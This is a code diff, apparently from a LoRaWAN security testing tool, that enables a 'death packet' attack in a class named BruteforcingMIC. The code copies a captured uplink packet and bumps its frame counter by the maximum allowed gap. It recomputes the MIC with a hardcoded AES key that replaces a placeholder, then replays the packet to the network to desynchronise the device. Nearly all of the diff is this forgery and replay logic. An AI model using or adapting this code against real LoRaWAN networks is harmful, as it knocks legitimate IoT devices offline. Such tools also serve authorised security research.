@@ -20,7 +20,7 @@ Lorawan_result BruteforcingMIC::sendGuardPacket( std::shared_ptr<DataPacket> dat
 
     unsigned long int ulCount = Common::bytes2ULong(copyPacket.getFrameCounter());
 
-    ulCount +=1;
+    ulCount += 1;
 
     copyPacket.setFrameCounter(Common::ulong2Bytes(ulCount));
 
@@ -58,7 +58,7 @@ Lorawan_result BruteforcingMIC::sendGuardPacket( std::shared_ptr<DataPacket> dat
     return Lorawan_result::Success;
 }
 
-Lorawan_result BruteforcingMIC::calculateMIC(DataPacket &dataPkt)
+Lorawan_result BruteforcingMIC::calculateMIC(DataPacket &dataPkt, bool changeFCnt)
 {
     std::cout << "Calculating new MIC value" << std::endl;
     std::cout << "previous value of MIC: " << Common::bytes2HexStr(dataPkt.getMIC()) << std::endl;
@@ -103,6 +103,15 @@ Lorawan_result BruteforcingMIC::calculateMIC(DataPacket &dataPkt)
     {
         _localFCnt.insert(_localFCnt.begin(), frameCounter.begin(), frameCounter.end());
     }
+    if(changeFCnt)
+    {
+        unsigned long int dosCount = Common::bytes2ULong(dataPkt.getFrameCounter());
+
+        dosCount += MAX_FCNT_GAP;
+
+        _localFCnt = Common::ulong2Bytes(dosCount);
+        std::cout << "changed value of FCnt: " << Common::bytes2HexStr(_localFCnt) << std::endl;
+    }
 
     bytes littleEndianFCnt{};
     if(Common::convertToLittleEndian(_localFCnt,littleEndianFCnt) != Lorawan_result::Success)
@@ -131,8 +140,7 @@ Lorawan_result BruteforcingMIC::calculateMIC(DataPacket &dataPkt)
 
     initBlock.emplace_back(static_cast<byte>(_msg.size()));
 
-    bytes key = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00,0x00, 0x00,0x00, 0x00,
-                 0x00, 0x00,0x02, 0x01};
+    bytes key = {0x04,0x39,0xCE,0x27,0x27,0x0C,0xB3,0xC9,0x7D,0x1D,0x40,0x8A,0x87,0x12,0x52,0x02};
 
     bytes message{};
     message.insert(message.begin(), initBlock.begin(), initBlock.end());
@@ -150,21 +158,58 @@ Lorawan_result BruteforcingMIC::calculateMIC(DataPacket &dataPkt)
     return Lorawan_result::Success;
 }
 
-Lorawan_result BruteforcingMIC::sendDeathPacket()
+Lorawan_result BruteforcingMIC::sendDeathPacket(std::shared_ptr<DataPacket> dataPkt)
 {
-    //calculateMIC();
+    std::string jsonToSend{};
+    DataPacket copyPacket(dataPkt);
+
+//    unsigned long int dosCount = Common::bytes2ULong(copyPacket.getFrameCounter());
+
+//    dosCount += 1;
+
+//    copyPacket.setFrameCounter(Common::ulong2Bytes(dosCount));
+//    std::cout << "changed value of FCnt: " << Common::bytes2HexStr(copyPacket.getFrameCounter()) << std::endl;
+
+    if(copyPacket.serialialize() != Lorawan_result::Success) //updated rawPacket
+        return Lorawan_result::ErrorSerialize;
+
+    if(calculateMIC(copyPacket, true) != Lorawan_result::Success)
+    {
+        return Lorawan_result::ErrorCalcMIC;
+    }
+
+    if(copyPacket.serialialize() != Lorawan_result::Success)
+        return Lorawan_result::ErrorSerialize;
+
+
+    if(createJsonToSend(copyPacket.getRawData(),copyPacket.getJsonString(),jsonToSend)
+            != Lorawan_result::Success)
+        return Lorawan_result::ErrorCreatingPacket;
+
+    std::chrono::milliseconds timespan(4000);
+    std::this_thread::sleep_for(timespan);
+
+    Tins::IP refIP = dataPkt->getPacketIP();
+    uplink.setIP(refIP);
+    std::cout << "packet is based on IP with id = " << std::to_string(refIP.id()) << std::endl;
+    std::cout << "sending guard packet with frame counter = " + std::to_string(Common::bytes2ULong(copyPacket.getFrameCounter())) << std::endl;
+
+    if(send(copyPacket.getMagicFour(),testDevice->getEui64(), jsonToSend) != Lorawan_result::Success)
+    {
+        std:: cout << "error sending guard packet!" << std::endl;
+    }
 
     return Lorawan_result::Success;
 }
 
-Lorawan_result BruteforcingMIC::setUpSending(std::shared_ptr<JoinRequestPacket> requestPkt)
+Lorawan_result BruteforcingMIC::setUpSending(std::shared_ptr<LorawanPacket> packet)
 {
-    testDevice->setAppEUI(requestPkt->getAppEUI());
-    testDevice->setDevEUI(requestPkt->getDevEUI());
-    testDevice->setEui64(requestPkt->getEui64());
+    //testDevice->setAppEUI(requestPkt->getAppEUI());
+    //testDevice->setDevEUI(requestPkt->getDevEUI());
+    testDevice->setEui64(packet->getEui64());
 
-    uplink.setDstPort(requestPkt->getDstPort());
-    uplink.setSrcPort(requestPkt->getSrcPort());
+    uplink.setDstPort(packet->getDstPort());
+    uplink.setSrcPort(packet->getSrcPort());
 
     return Lorawan_result::Success;
 }
@@ -173,19 +218,16 @@ Lorawan_result BruteforcingMIC::launch()
     PacketStorage *storage = PacketStorage::getInstance();
 
     std::vector<std::shared_ptr<JoinRequestPacket> > requests = storage->getRequestPacket();
+    std::vector<std::shared_ptr<DataPacket> > macPayloads = storage->getMacPayloadPacket();
 
-
-    if(requests.size() > 0)
+//    if(requests.size() > 0)
+//    {
+    if(macPayloads.size() > 0)
     {
-        if(setUpSending(requests.front()) != Lorawan_result::Success)
+        if(setUpSending(macPayloads.front()) != Lorawan_result::Success)
         {
             return Lorawan_result::ErrorTestSetUp;
         }
-
-        std::vector<std::shared_ptr<DataPacket> > macPayloads = storage->getMacPayloadPacket();
-
-        if(macPayloads.size() > 0)
-        {
 
             std::shared_ptr<DataPacket> firstPayload = macPayloads.at(0); // based on number
 
@@ -194,24 +236,24 @@ Lorawan_result BruteforcingMIC::launch()
                 return Lorawan_result::ErrorTestSetUp;
             }
 
-            //            if(sendDeathPacket() != Lorawan_result::Success)
-            //            {
-            //                return Lorawan_result::ErrorTest;
-            //            }
+            if(sendDeathPacket(firstPayload) != Lorawan_result::Success)
+            {
+                return Lorawan_result::ErrorTest;
+            }
 
 
-        } else
-        {
-            std::cout << "no payload packets" << std::endl;
-            return Lorawan_result::ErrorTest;
-        }
-
-    }
-    else
+    } else
     {
-        std::cout << "no requests packets" << std::endl;
+        std::cout << "no payload packets" << std::endl;
         return Lorawan_result::ErrorTest;
     }
+
+//    }
+//    else
+//    {
+//        std::cout << "no requests packets" << std::endl;
+//        return Lorawan_result::ErrorTest;
+//    }
 
 
     return Lorawan_result::Success;
